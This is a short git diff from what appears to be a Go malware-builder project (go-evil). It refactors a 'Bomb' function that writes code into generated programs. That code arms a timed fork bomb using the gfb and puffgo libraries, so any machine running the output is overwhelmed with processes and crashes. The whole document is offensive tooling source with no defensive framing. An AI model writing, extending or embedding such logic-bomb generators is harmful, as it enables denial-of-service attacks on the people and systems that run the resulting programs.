@@ -4,6 +4,7 @@ import (
 	"fmt"
 
 	"github.com/TeamPhoneix/go-evil/utility/structure"
+	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
 	"github.com/TeamPhoneix/go-evil/utility/tools"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
@@ -28,13 +29,14 @@ func Bomb(value string, s_json string) ([]string, string) {
 
 	executioner := arr.Get(1)
 
-	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(timer int){", function_call),
-		"interval := time.Duration(timer) * time.Millisecond",
-		fmt.Sprintf("el := puffgo.NewListener(&interval, %s)", executioner),
-		"fb := fbomb.NewBomb(el)",
-		"fb.Arm()",
-		"}"})
+	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
+		Parameters: []string{"timer int"},
+		Gut: []string{
+			"interval := time.Duration(timer) * time.Millisecond",
+			fmt.Sprintf("el := puffgo.NewListener(&interval, %s)", executioner),
+			"fb := fbomb.NewBomb(el)",
+			"fb.Arm()",
+		}})
 
 	data_object.Add_go_import("github.com/ARaChn3/gfb")
 	data_object.Add_go_import("github.com/ARaChn3/puffgo")
